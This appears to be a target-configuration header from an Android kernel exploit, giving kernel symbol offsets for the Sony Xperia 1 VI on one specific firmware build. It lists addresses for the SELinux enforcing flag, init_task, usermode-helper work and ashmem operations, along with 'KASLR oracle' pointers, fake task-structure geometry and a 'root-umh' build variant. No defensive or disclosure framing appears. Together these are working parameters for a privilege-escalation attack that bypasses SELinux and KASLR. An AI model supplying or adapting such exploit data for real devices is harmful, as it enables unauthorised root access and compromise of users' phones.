...
/*
 * Xperia 1 VI (XQ-EC72 / PDX245) — Sony firmware 69.2.A.4.90
 * SoC: SM8650 (Snapdragon 8 Gen 3)
 * Kernel: 6.1.162-android14-11-g40b1a8089d75-ab14960999
 * Fingerprint: Sony/XQ-EC72/XQ-EC72:16/69.2.A.4.90/069002A004009001394738713:user/release-keys
 *
 * Symbol offsets: extracted from embedded kallsyms (102397 symbols).
 * Derived pointers: verified by reading kernel image binary at symbol addresses.
 * task_struct offsets: PROVISIONAL — copied from e2s-S926BXXUEDZDR (6.1.157,
 *   same GKI base). Must be verified via on-device BTF or /proc/config.gz.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL \
  "xperia1vi-69.2.A.4.90-app"
#define APP_DEFAULT_FAST_KSNITCH 0
...
#else
#define BUILD_VARIANT_LABEL "xperia1vi-69.2.A.4.90-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "Sony/XQ-EC72/XQ-EC72:16/69.2.A.4.90/" \
  "069002A004009001394738713:user/release-keys"
#endif
...
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dafb0ULL
...
#define P0_FINGERPRINT_HEADER \
  "targets/xperia1vi-69.2.A.4.90/p0_fingerprint.h"
#endif

/* ---------- direct-map / identity range ---------- */
...
/* ---------- kernel symbol offsets (from kallsyms) ---------- */

#define ASHMEM_MISC_FOPS_OFF 0x0217cc80ULL
#define ASHMEM_FOPS_OFF 0x01281910ULL
#define ASHMEM_IOCTL_OFF 0x00c3cdf0ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00c3d728ULL
#define ASHMEM_MMAP_OFF 0x00c3d780ULL
#define ASHMEM_OPEN_OFF 0x00c3d9a0ULL
#define ASHMEM_RELEASE_OFF 0x00c3da28ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00c3db48ULL
#define CONFIGFS_READ_ITER_OFF 0x00464c20ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00465150ULL
#define COPY_SPLICE_READ_OFF 0x003e68a8ULL
#define NOOP_LLSEEK_OFF 0x00398e88ULL
#define INIT_TASK_OFF 0x0201f440ULL
#define ROOT_TASK_GROUP_OFF 0x02208580ULL
#define SELINUX_ENFORCING_OFF 0x0225a448ULL
#define KMALLOC_CACHES_OFF 0x015cfe58ULL
#define ANON_PIPE_BUF_OPS_OFF 0x0110a110ULL
...
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d37f4ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x0200ac60ULL
...
/* ---------- KASLR P0 oracle pointers ---------- */

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0152a38fULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x020127d0ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02137cb0ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x0227b4d8ULL
...
/* ---------- fake waiter / fake task geometry ---------- */
...
/*
 * PROVISIONAL task_struct offsets — carried from e2s (Samsung 6.1.157).
 * Sony's kernel config may shift these. Verify via on-device BTF
 * (/sys/kernel/btf/vmlinux) or pahole on the extracted BTF blob.
 */
